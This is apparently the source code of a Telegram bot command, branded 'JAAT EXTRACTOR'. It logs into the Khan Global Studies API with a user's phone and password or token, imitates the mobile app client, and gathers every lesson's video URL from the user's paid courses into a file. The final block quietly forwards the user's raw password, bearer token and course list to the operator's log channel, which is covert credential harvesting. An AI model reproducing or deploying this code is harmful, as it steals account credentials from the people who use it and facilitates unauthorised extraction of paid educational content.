import json
import os
import requests
from pyrogram import filters
from Extractor import app
from config import PREMIUM_LOGS
log_channel = PREMIUM_LOGS


@app.on_message(filters.command(["kgs"]))
async def khan_login(app, message):
    input1 = await app.ask(message.chat.id, text="<blockquote>*Send ID & Password in this manner otherwise bot will not respond.\n\nSend like this:-  ID*Password** or just send your token**</blockquote>")

    raw_text = input1.text
    await input1.delete(True)

    if '*' in raw_text:
        
        phone, password = raw_text.split("*", 1)

        login_url = "https://khanglobalstudies.com/api/login-with-password"
        headers = {
            "Host": "khanglobalstudies.com",
            "content-type": "application/x-www-form-urlencoded",
            "content-length": "36",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        }

        data = {
            "phone": phone,
            "password": password
        }

        response = requests.post(login_url, headers=headers, data=data)
        if response.status_code == 200:
            data = response.json()
            token = data["token"]
            await message.reply_text("<blockquote>**Login Successful**</blockquote>")
        else:
            await message.reply_text("Login failed. Please check your ID and password.")
    else:
        
        token = raw_text
        await message.reply_text("<blockquote>**Token received, proceeding...**</blockquote>")

    headers = {
        "Host": "khanglobalstudies.com",
        "authorization": f"Bearer {token}",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.9.1"
    }

    course_url = "https://khanglobalstudies.com/api/user/v2/courses"
    response = requests.get(course_url, headers=headers)

    data = response.json()
    
    courses = [(course['id'], course['title'], course['price'], course['c_expire_at'],course['start_at']) for course in data]

    FFF = "BATCH-ID  - BATCH-NAME\n\n"

    for course_id, course_title, course_price, c_expire_at, course_start_at in courses:
        FFF += f"`{course_id}` - **{course_title}**\n\n"

    await message.reply_text(f"<blockquote>{FFF}</blockquote>")

    input3 = await app.ask(message.chat.id, text="<blockquote>**Now send the Batch ID to Download**</blockquote>")    
    raw_text3 = input3.text
    
    batch_name = "KHANSIR"  


    for course in data:
        if str(course['id']) == raw_text3:
            batch_name = course['title']
            break
            
    url = "https://khanglobalstudies.com/api/user/courses/"+raw_text3+"/v2-lessons"
    response2 = requests.get(url, headers=headers)
    
    
    msg = await message.reply_text("<blockquote>**Prepared your course id**</blockquote>")
    bat_id = ""
    for data in response2.json():
        baid = f"{data['id']}&"
        bat_id += baid
        
          
    await msg.edit_text("<blockquote>**Done your course id\n Now Extracting your course**</blockquote>")
    full = ""
    try:
        xv = bat_id.split('&')
        for y in range(0,len(xv)):
            t =xv[y]
            try:
                url = "https://khanglobalstudies.com/api/lessons/"+t  
                response = requests.get(url, headers=headers)
                data = response.json()
                
        
                videos = data.get('videos', [])
                fuck = ""
                for video in reversed(videos): 
                    class_title = video.get('name')
                    class_url = video.get('video_url')
                    fuck += f"{class_title}: {class_url}\n"
        
                full += fuck
            except Exception as e:
                print(str(e))
                pass
                
        with open(f"{raw_text3}_{batch_name}.txt", 'a') as f:
            f.write(f"{full}")
            
        
        
        dl = (f"<blockquote>KHAN SIR LOGIN SUCCESS\n\n `{raw_text}`\n\n`{token}`\n{FFF}</blockquote>")
        credit = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id})\n\n"
        c_txt = f"**App Name: Khan-Sir\nBatch Name:** `{batch_name}`\n** Batch Price - Rs**{course_price}\n**Expiry Date:-**{c_expire_at}\n **Extracted BY:{credit}** \n\n  **╾───• JAAT EXTRACTOR ───╼** "
        await message.reply_document(document=f"{raw_text3}_{batch_name}.txt", caption=c_txt)
        await app.send_document(log_channel, document=f"{raw_text3}_{batch_name}.txt", caption=c_txt)
        await app.send_message( log_channel ,dl )
        os.remove(f"{raw_text3}_{batch_name}.txt")

    except Exception as e:
        await message.reply_text(str(e))


    
